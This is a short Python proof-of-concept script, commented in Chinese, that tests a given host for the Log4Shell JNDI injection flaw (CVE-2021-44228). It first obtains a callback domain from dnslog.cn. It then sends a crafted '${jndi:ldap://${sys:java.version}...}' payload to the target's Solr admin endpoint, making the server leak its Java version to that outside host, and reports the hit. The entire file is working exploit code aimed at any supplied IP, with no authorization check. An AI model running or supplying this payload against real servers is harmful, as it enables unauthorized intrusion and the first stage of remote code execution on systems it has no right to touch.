##################################Apache Log4j2 lookup JNDI 注入漏洞（CVE-2021-44228）###################################################
import requests
import re
import time
def connect(ip):
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"  # 构造请求头
    }
    dns_url="http://dnslog.cn"
    dns_url1=dns_url+f'/getdomain.php?t=0.46539629555654667'
    # print(dns_url1)
    #dns_url = "http://dnslog.cn/getdomain.php?t=0.39239629566663557"  # 访问dns_log
    response = requests.get(url=dns_url1, headers=headers1)
    getdns = response.text  # 获取dns
    # print(getdns)

    get_cookie = response.headers['Set-Cookie']
    agex = ".*(?=;)"
    cookie = re.findall(agex,get_cookie)[0]
    # print(cookie)
    headers2 = {
        "Host": ip,
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Connection": "close"
    }
    headers3={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
        # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", # 构造请求头
        "Cookie": cookie
    }
    # print(headers3)
    # url=f'ip/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com}'
    url = f'{ip}/solr/admin/cores?action=${{jndi:ldap://${{sys:java.version}}.{getdns}}}'
    # print(url)
    res1=requests.get(headers=headers2,url=url)
    # print(res1)
    dns_url2=dns_url+f'/getrecords.php?t=0.18588885265917524'
    # print(dns_url2)
    res2=requests.get(url=dns_url2,headers=headers3,timeout=10000)
    # if getdns in res2.text:
    #         print('1111')
    #print(res2.text)
    #print(getdns)
    #print(get_cookie)
    #print(cookie)
    if getdns in res2.text:
        print('存在CVE-2021-44228漏洞！')
        return 0